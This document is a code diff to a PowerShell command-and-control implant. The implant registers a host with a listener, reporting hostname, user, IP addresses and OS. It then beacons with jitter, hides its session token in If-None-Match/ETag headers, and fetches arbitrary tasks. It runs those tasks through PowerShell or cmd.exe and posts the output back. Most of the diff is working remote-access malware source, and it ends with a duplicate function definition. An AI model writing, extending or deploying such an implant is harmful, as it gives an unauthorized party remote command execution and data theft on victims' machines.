@@ -3,7 +3,8 @@ param(
   [int]$WPort = 80,
   [string]$Key = '448b5e4bf0d8d311e4e94b79868885206ebaefce7294bbbb119a2467a9d9b6e3',
   [int]$MinBackoffSec = 5,
-  [int]$MaxBackoffSec = 120
+  [int]$MaxBackoffSec = 120,
+  [bool]$LogHttp = $true
 )
 
 $ErrorActionPreference = 'Stop'
@@ -20,14 +21,50 @@ $callbackInterval = 60
 $jitterPct        = 15
 $pendingTaskResult = $null
 
+# Pluggable task handlers registry
+$script:TaskHandlers = @{}
+
+function Register-TaskHandler {
+  param(
+    [Parameter(Mandatory=$true)][string]$Name,
+    [Parameter(Mandatory=$true)][scriptblock]$Handler
+  )
+  $script:TaskHandlers[$Name.ToLower()] = $Handler
+}
+
+# HTTP logging helper (defined early so it's available to all functions)
+function Log-HttpResponse {
+  param(
+    [string]$Phase,
+    [Parameter(Mandatory=$true)] $Resp
+  )
+  try {
+    $code = $null
+    try { $code = [int]$Resp.StatusCode } catch {}
+    $etag = $null
+    try { if ($Resp.Headers -and $Resp.Headers['ETag']) { $etag = ([string]$Resp.Headers['ETag']).Trim('"') } } catch {}
+    $body = $null
+    try { $body = $Resp.Content } catch {}
+    if ($code -ne $null) {
+      $line = "[http:{0}] status={1}" -f $Phase, $code
+      if ($etag) { $line = "$line etag=$etag" }
+      Write-Host $line
+    }
+    if ($body -and [string]::IsNullOrWhiteSpace([string]$body) -eq $false) {
+      Write-Host ("[http:{0}] body: {1}" -f $Phase, $body)
+    }
+  } catch {}
+}
+
 function Get-AgentProfile {
   $os = (Get-CimInstance Win32_OperatingSystem)
+  $IPs = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.254*' -and $_.IPAddress -ne '127.0.0.1' }).IPAddress
   $json = [pscustomobject]@{
     agent_key         = $Key
     hostname          = $env:COMPUTERNAME
-    ip_addr           = @('10.10.150.11')   # swap/augment as needed
+    ip_addr           = @($IPs)
     os                = $os.Caption
-    build             = ( "$os.BuildNumber  $os.Version")
+    build             = ("$($os.BuildNumber)  $($os.Version)")
     pid               = $reportedPid
     user              = "$env:USERDOMAIN/$env:USERNAME"
     cwd               = (Get-Location).Path
@@ -35,6 +72,7 @@ function Get-AgentProfile {
     jitter_value      = $jitterPct
     default_shell     = 'powershell'
     IntegrityLevel    = 'user'
+    base_agent        = 'toliet_oracle'
   } | ConvertTo-Json -Depth 4
   return $json
 }
@@ -42,12 +80,15 @@ function Get-AgentProfile {
 function Register-Agent {
   $body = Get-AgentProfile
   $resp = Invoke-WebRequest -Uri $registerUri -Method POST -ContentType 'application/json' -Body $body
+  if ($LogHttp) { Log-HttpResponse -Phase 'register' -Resp $resp }
   $obj  = $resp.Content | ConvertFrom-Json
+  $etag = $null
+  try { if ($resp.Headers -and $resp.Headers['ETag']) { $etag = [string]$resp.Headers['ETag'] } } catch {}
+  if ($etag) { $etag = $etag.Trim('"') }
   [pscustomobject]@{
     StatusCode       = $resp.StatusCode
-    SessionToken     = $obj.session_token
-    # Some servers return "interval" instead of "callback_interval"; support both
-    CallbackInterval = if ($obj.callback_interval) { [int]$obj.callback_interval } elseif ($obj.interval) { [int]$obj.interval } else { $null }
+    SessionToken     = if ($etag) { $etag } elseif ($obj.PSObject.Properties.Name -contains 'session_key') { $obj.session_key } elseif ($obj.PSObject.Properties.Name -contains 'session_token') { $obj.session_token } elseif ($obj.PSObject.Properties.Name -contains 'sessionKey') { $obj.sessionKey } else { $null }
+    CallbackInterval = $null
     Raw              = $obj
   }
 }
@@ -56,19 +97,24 @@ function Poll-Once {
   param([string]$SessionToken)
 
   $headers = @{}
+  # Listener expects session in If-None-Match header (kept for compatibility)
   if ($SessionToken) { $headers['If-None-Match'] = $SessionToken }
 
   try {
     $r = Invoke-WebRequest -Uri $pollUri -Method GET -Headers $headers
+    if ($LogHttp) { Log-HttpResponse -Phase 'poll' -Resp $r }
     $code = [int]$r.StatusCode
     if ($code -eq 200) {
       $data = $r.Content | ConvertFrom-Json
+      $etag = $null
+      try { if ($r.Headers -and $r.Headers['ETag']) { $etag = [string]$r.Headers['ETag'] } } catch {}
+      if ($etag) { $etag = $etag.Trim('"') }
       return [pscustomobject]@{
         Code            = 200
         Data            = $data
         # Accept either callback_interval or interval from server
-        CallbackInterval= if ($data.callback_interval) { [int]$data.callback_interval } elseif ($data.interval) { [int]$data.interval } else { $null }
-        NewSessionToken = if ($data.session_token) { $data.session_token } else { $null }
+        CallbackInterval= $null
+        NewSessionToken = if ($etag) { $etag } elseif ($data.session_key) { $data.session_key } elseif ($data.session_token) { $data.session_token } else { $null }
       }
     } else {
       return [pscustomobject]@{ Code = $code; Data = $null }
@@ -171,26 +217,122 @@ function Submit-TaskResult {
   )
   try {
     $payload = [pscustomobject]@{
-      agent_key     = $Key
-      session_token = $SessionToken
       task_result   = $ResultText
       hostname      = $env:COMPUTERNAME
       when          = (Get-Date).ToString('o')
     } | ConvertTo-Json -Depth 4
-    $r = Invoke-WebRequest -Uri $registerUri -Method POST -ContentType 'application/json' -Body $payload
-    if ([int]$r.StatusCode -ge 200 -and [int]$r.StatusCode -lt 300) {
-      Write-Host "[task] Submitted result (${($ResultText.Length)} chars)."
-      return $true
-    }
-    Write-Host "[task] Submit failed: HTTP $($r.StatusCode)"
-    return $false
+    # Listener expects session in If-None-Match header (kept for compatibility)
+    $headers = @{ 'If-None-Match' = $SessionToken }
+    $r = Invoke-WebRequest -Uri $registerUri -Method POST -Headers $headers -ContentType 'application/json' -Body $payload
+    if ($LogHttp) { Log-HttpResponse -Phase 'submit' -Resp $r }
+    # Treat only 200 as success; 202 is a decoy in our listener
+    $ok = ([int]$r.StatusCode -eq 200)
+    $newKey = $null; $interval = $null
+    try {
+      $data = $r.Content | ConvertFrom-Json
+      if ($data.session_key) { $newKey = [string]$data.session_key }
+      elseif ($data.session_token) { $newKey = [string]$data.session_token }
+      if ($r.Headers -and $r.Headers['ETag'] -and -not $newKey) { $newKey = ([string]$r.Headers['ETag']).Trim('"') }
+    } catch {}
+    if ($ok) { Write-Host "[task] Submitted result (${($ResultText.Length)} chars)." }
+    return [pscustomobject]@{ Success = $ok; NewSessionToken = $newKey; CallbackInterval = $interval }
   } catch {
     Write-Host ("[task] Submit error: {0}" -f $_.Exception.Message)
-    return $false
+    return [pscustomobject]@{ Success = $false; NewSessionToken = $null; CallbackInterval = $null }
+  }
+}
+
+# --- Task runtime and dispatch ---
+
+function Run-Set {
+  param([string[]]$Args)
+  if (-not $Args -or $Args.Count -lt 2) { 
+    Write-Host "[task] Agrs less than 2"
+    Write-Host "[task] Agrgs: $Args"
+    return 'false' }
+  
+  $name = $Args[0].ToLower()
+  $value = $Args[1]
+  Write-Host "[task] Arg[0] value is $($Args[0])"
+   Write-Host "[task] Arg[1] value is $($Args[1])"
+  switch ($name) {
+    'jitter' {
+      try { $v = [int]$value } catch { return 'false' }
+      if ($v -ge 0 -and $v -le 100) { $script:jitterPct = $v; return 'true' } else { return 'false' }
+    }
+    'interval' {
+      try { $iv = [int]$value } catch { return 'false' }
+      if ($iv -ge 1 -and $iv -le 86400) { $script:callbackInterval = $iv; return 'true' } else { return 'false' }
+    }
+    default { return 'false' }
+  }
+}
+
+function Run-PowerShell {
+  param([string[]]$Args)
+  $cmdText = ($Args -join ' ').Trim()
+  if (-not $cmdText) { return '' }
+  return Invoke-AgentTask -Command $cmdText
+}
+
+function Run-Cmd {
+  param([string[]]$Args)
+  $cmdText = ($Args -join ' ').Trim()
+  if (-not $cmdText) { return '' }
+  try {
+    $out = & cmd.exe /c $cmdText 2>&1 | Out-String
+    if ($null -eq $out) { $out = '' }
+    return $out
+  } catch { return ("[cmd error] {0}" -f $_.Exception.Message) }
+}
+
+function Register-DefaultHandlers {
+  Register-TaskHandler -Name 'set'        -Handler { param($a) Run-Set -Args $a }
+  Register-TaskHandler -Name 'powershell' -Handler { param($a) Run-PowerShell -Args $a }
+  Register-TaskHandler -Name 'ps'         -Handler { param($a) Run-PowerShell -Args $a }
+  Register-TaskHandler -Name 'cmd'        -Handler { param($a) Run-Cmd -Args $a }
+}
+
+function Run-Task {
+  param([string]$TaskText)
+  if (-not $TaskText) { return '' }
+  $parts = [regex]::Split($TaskText.Trim(), '\s+')
+  if ($parts.Length -eq 0) { return '' }
+  $verb = $parts[0].ToLower()
+  $args = @()
+  if ($parts.Length -gt 1) { $args = $parts[1..($parts.Length-1)] }
+
+  if ($script:TaskHandlers.ContainsKey($verb)) {
+    $handler = $script:TaskHandlers[$verb]
+    # Invoke the handler and return its string result; do NOT execute the result as a command
+    try { return ($handler.Invoke($args)) } catch { return ("[handler error] {0}" -f $_.Exception.Message) }
+  }
+
+  # Fallback: run the full text via PowerShell
+  return Invoke-AgentTask -Command $TaskText
+}
+
+function Process-PollResponse {
+  param([object]$Poll)
+  if (-not $Poll -or $Poll.Code -ne 200) { return }
+  $taskCmd = $null
+  if ($Poll.Data -and $Poll.Data.PSObject -and $Poll.Data.PSObject.Properties.Name -contains 'Task') {
+    $taskCmd = [string]$Poll.Data.Task
+  } elseif ($Poll.Data -and $Poll.Data.PSObject -and $Poll.Data.PSObject.Properties.Name -contains 'task') {
+    $taskCmd = [string]$Poll.Data.task
+  }
+  if ($taskCmd -and $taskCmd.Trim().Length -gt 0) {
+    Write-Host ("[task] Executing: {0}" -f $taskCmd)
+    $res = Run-Task -TaskText $taskCmd
+    $maxLen = 32768
+    if ($res.Length -gt $maxLen) { $res = $res.Substring(0, $maxLen) + "... [truncated]" }
+    $script:pendingTaskResult = $res
+    Write-Host ("[task] Captured {0} chars; will return next check-in." -f $script:pendingTaskResult.Length)
   }
 }
 
 # --- main ---
+Register-DefaultHandlers
 Write-Verbose "Registering agent at $registerUri"
 $reg = Register-Agent
 if ($reg.StatusCode -ne 200 -and $reg.StatusCode -ne 201) {
@@ -199,48 +341,36 @@ if ($reg.StatusCode -ne 200 -and $reg.StatusCode -ne 201) {
 
 $sessionToken     = $reg.SessionToken
 $callbackInterval = if ($reg.CallbackInterval) { $reg.CallbackInterval } else { $callbackInterval }
-if (-not $sessionToken) { throw "No session_token received at registration." }
+if (-not $sessionToken) { throw "No session_key received at registration." }
 
 Write-Host "Registered. SessionToken=$sessionToken, interval=${callbackInterval}s"
 
 $backoff = $MinBackoffSec
+$justRegistered = $true
 while ($true) {
   $tickStart = Get-Date
+  $didPostThisCycle = $false
   # If we have a pending result from a previously executed task, push it up first
   if ($pendingTaskResult -and $pendingTaskResult.Trim().Length -gt 0) {
-    if (Submit-TaskResult -ResultText $pendingTaskResult -SessionToken $sessionToken) {
+    $submit = Submit-TaskResult -ResultText $pendingTaskResult -SessionToken $sessionToken
+    if ($submit -and $submit.Success) {
+      if ($submit.NewSessionToken) { $sessionToken = $submit.NewSessionToken }
+      if ($submit.CallbackInterval) { $callbackInterval = $submit.CallbackInterval }
       $pendingTaskResult = $null
+      $didPostThisCycle = $true
     }
   }
-  $poll = Poll-Once -SessionToken $sessionToken
+  $poll = $null
+  $skipPollThisCycle = $didPostThisCycle -or $justRegistered
+  if (-not $skipPollThisCycle) {
+    $poll = Poll-Once -SessionToken $sessionToken
+  }
 
+  if ($poll) {
   switch ($poll.Code) {
     200 {
       if ($poll.NewSessionToken) { $sessionToken = $poll.NewSessionToken }
-      # Apply any tasking/settings returned by the server
-      if ($poll.Data) { Apply-Tasking -Data $poll.Data }
-      if ($poll.CallbackInterval) { $callbackInterval = $poll.CallbackInterval }
-
-      # If a task was supplied, execute and hold the result for the next check-in
-      $taskCmd = $null
-      if ($poll.Data -and $poll.Data.PSObject -and $poll.Data.PSObject.Properties.Name -contains 'Task') {
-        $taskCmd = [string]$poll.Data.Task
-      } elseif ($poll.Data -and $poll.Data.PSObject -and $poll.Data.PSObject.Properties.Name -contains 'task') {
-        $taskCmd = [string]$poll.Data.task
-      }
-      if ($taskCmd -and $taskCmd.Trim().Length -gt 0) {
-        Write-Host ("[task] Executing: {0}" -f $taskCmd)
-        $res = Invoke-AgentTask -Command $taskCmd
-        # Keep result modest to avoid overly large posts
-        $maxLen = 32768
-        if ($res.Length -gt $maxLen) { $res = $res.Substring(0, $maxLen) + "... [truncated]" }
-        $pendingTaskResult = $res
-        Write-Host ("[task] Captured {0} chars; will return next check-in." -f $pendingTaskResult.Length)
-      }
-
-      # Do something with $poll.Data if your server actually sends work.
-      # For now, just log the fact we got fresh content.
-      Write-Host ("[{0:u}] Work payload received: {1}" -f (Get-Date), ($poll.Data | ConvertTo-Json -Depth 6))
+      Process-PollResponse -Poll $poll
       $backoff = $MinBackoffSec
     }
     304 {
@@ -257,6 +387,12 @@ while ($true) {
       continue
     }
   }
+  } else {
+    # No poll this cycle (e.g., immediately after registration or after POST). Use minimum backoff.
+    $backoff = $MinBackoffSec
+  }
+
+  $justRegistered = $false
 
   # Honor interval (minus the time we just spent)
   $elapsed = [int]((Get-Date) - $tickStart).TotalSeconds
@@ -269,4 +405,27 @@ while ($true) {
   $offset = if ($jDelta -gt 0) { Get-Random -Minimum $minJ -Maximum $maxJ } else { 0 }
   $sleepFor = [int]([math]::Max(0, $base + $offset))
   if ($sleepFor -gt 0) { Start-Sleep -Seconds $sleepFor }
+}
+
+function Log-HttpResponse {
+  param(
+    [string]$Phase,
+    [Parameter(Mandatory=$true)] $Resp
+  )
+  try {
+    $code = $null
+    try { $code = [int]$Resp.StatusCode } catch {}
+    $etag = $null
+    try { if ($Resp.Headers -and $Resp.Headers['ETag']) { $etag = ([string]$Resp.Headers['ETag']).Trim('"') } } catch {}
+    $body = $null
+    try { $body = $Resp.Content } catch {}
+    if ($code -ne $null) {
+      $line = "[http:{0}] status={1}" -f $Phase, $code
+      if ($etag) { $line = "$line etag=$etag" }
+      Write-Host $line
+    }
+    if ($body -and [string]::IsNullOrWhiteSpace([string]$body) -eq $false) {
+      Write-Host ("[http:{0}] body: {1}" -f $Phase, $body)
+    }
+  } catch {}
 }
